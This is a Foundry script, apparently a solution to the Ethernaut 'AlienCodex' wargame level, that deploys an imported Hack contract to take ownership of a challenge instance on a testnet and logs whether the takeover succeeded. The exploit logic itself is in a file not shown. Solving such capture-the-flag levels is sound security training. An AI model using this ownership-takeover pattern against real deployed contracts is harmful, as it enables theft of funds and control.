// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack} from "../src/level19.sol";

interface IAlienCodex {
    function owner() external view returns (address);

    function contact() external view returns (bool);

    function makeContact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract Level19Script is Script {
    function run(address instanceAddress, address hacker) external {
        IAlienCodex target = IAlienCodex(instanceAddress);
        address ownerBefore = target.owner();
        console.log("Owner before: ", ownerBefore);
        console.log("Hacker address: ", hacker);

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        hackContract.hack();
        vm.stopBroadcast();

        address ownerAfter = target.owner();
        console.log("Owner after: ", ownerAfter);
        console.log("Attack successful: ", ownerAfter == hacker);
    }
}
//forge script script/level19.s.sol:Level19Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address,address)" your instance address your wallet address
